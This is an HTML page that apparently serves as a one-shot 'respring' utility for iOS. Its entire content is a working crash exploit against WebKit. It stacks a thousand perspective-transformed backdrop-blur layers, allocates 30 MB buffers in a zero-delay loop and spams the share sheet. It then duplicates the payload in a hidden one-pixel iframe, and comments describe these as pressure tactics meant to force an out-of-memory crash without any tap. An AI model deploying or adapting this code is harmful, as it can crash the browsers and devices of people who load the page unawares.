<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Respring</title>
<style>
  html, body {
    margin: 0;
    padding: 0;
    background: #0b0b10;
    color: #f4f4f8;
    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", system-ui, sans-serif;
    height: 100%;
    overflow: hidden;
    -webkit-text-size-adjust: 100%;
  }
  .wrap {
    position: absolute;
    inset: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    text-align: center;
    padding: 24px;
    pointer-events: none;
  }
  .status {
    font-size: 1.05rem;
    font-weight: 600;
    letter-spacing: 0.01em;
    opacity: 0.85;
  }
  /* Visible 1x1 pixel bottom-right with non-zero opacity. Offscreen / fully
     transparent positioning lets WebKit skip painting the perspective blur
     layers, so the OOM never fires. */
  .respring-frame {
    position: fixed;
    right: 0;
    bottom: 0;
    width: 1px;
    height: 1px;
    border: 0;
    opacity: 0.01;
    pointer-events: none;
  }
</style>
</head>
<body>
<div class="wrap">
  <div class="status">
    Respringing&hellip;
    <br>
    <span style="font-size: 0.7rem; opacity: 0.6;">Method by <a href="https://github.com/neonmodder123" style="color: inherit; text-decoration: none;">neonmodder123</a></span>
  </div>
</div>
<script>
(function () {
  // Auto-fire path (no user activation): the host app calls this page
  // straight after its own confirmation prompt, so no in-page tap should be
  // required. navigator.share rejects without user activation, but the
  // perspective + backdrop-blur GPU pressure plus interval-driven 30 MB
  // allocations alone tend to be enough to take WebContent down. Scaled up
  // 2x relative to index.html runRespring() to compensate for the missing
  // navigator.share pressure tactic.
  function fireBlast(doc) {
    var container = doc.createElement('div');
    container.style.cssText = 'perspective:1px;perspective-origin:9999999% 9999999%;position:fixed;top:0;left:0;width:100vw;height:100vh;';
    doc.body.appendChild(container);
    for (var i = 0; i < 1000; i++) {
      var d = doc.createElement('div');
      d.style.cssText = 'position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,' + i + 'px) rotateY(90deg);opacity:0.99;';
      container.appendChild(d);
    }
    var win = doc.defaultView || window;
    win.setInterval(function () {
      try { win.navigator.share({title: 'R', text: 'R'.repeat(100000)}); } catch (e) {}
      try {
        var x = new win.Uint8Array(1024 * 1024 * 30);
        win.crypto.getRandomValues(x);
      } catch (e) {}
    }, 0);
  }

  try { fireBlast(document); } catch (e) {}

  // Run the same payload inside a sandboxed iframe so we get a second
  // independent WebContent thread of allocations + a second composited
  // perspective layer tree. Two parallel pressure sources push past whatever
  // headroom WebContent has.
  var frame = document.createElement('iframe');
  frame.id = 'respringFrame';
  frame.className = 'respring-frame';
  frame.setAttribute('sandbox', 'allow-forms allow-modals allow-scripts allow-same-origin');
  frame.srcdoc = [
    '<!doctype html><html><body style="margin:0;overflow:hidden;">',
    '<script>',
    'var container=document.createElement("div");',
    'container.style.cssText="perspective:1px;perspective-origin:9999999% 9999999%;";',
    'document.body.appendChild(container);',
    'for(var i=0;i<1000;i++){',
    'var d=document.createElement("div");',
    'd.style.cssText="position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,"+i+"px) rotateY(90deg);opacity:0.99;";',
    'container.appendChild(d);',
    '}',
    'setInterval(function(){',
    'try{navigator.share({title:"R",text:"R".repeat(100000)});}catch(e){}',
    'try{var x=new Uint8Array(1024*1024*30);crypto.getRandomValues(x);}catch(e){}',
    '},0);',
    '<\/script>',
    '</body></html>'
  ].join('');
  document.body.appendChild(frame);
})();
</script>
</body>
</html>
